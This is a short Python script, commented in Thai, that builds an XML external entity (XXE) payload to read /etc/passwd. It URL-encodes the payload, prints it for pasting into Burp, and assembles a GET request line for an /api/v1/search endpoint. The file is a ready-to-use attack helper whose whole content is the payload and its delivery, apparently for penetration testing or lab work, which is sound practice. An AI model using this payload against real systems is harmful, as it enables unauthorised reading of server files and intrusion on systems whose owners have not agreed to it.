import urllib.parse

# 1. วาง Payload ที่คุณต้องการแปลงในนี้ (ใส่เป็น String)
xxe_payload = '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>'

# 2. ใช้ฟังก์ชัน quote() เพื่อทำการ URL Encode
encoded_payload = urllib.parse.quote(xxe_payload)

# 3. Print ผลลัพธ์ออกมา
print("🔹 Payload แบบธรรมดา:")
print(xxe_payload)
print("\n🚀 Payload แบบ URL Encoded (ก๊อปไปวางใน Burp ได้เลย):")
print(encoded_payload)

# 4. แถม: สร้างเป็น URL เต็มๆ ให้เลย
full_url = f"GET /api/v1/search?q={encoded_payload} HTTP/1.1"
print("\n🔗 Full Request Line:")
print(full_url)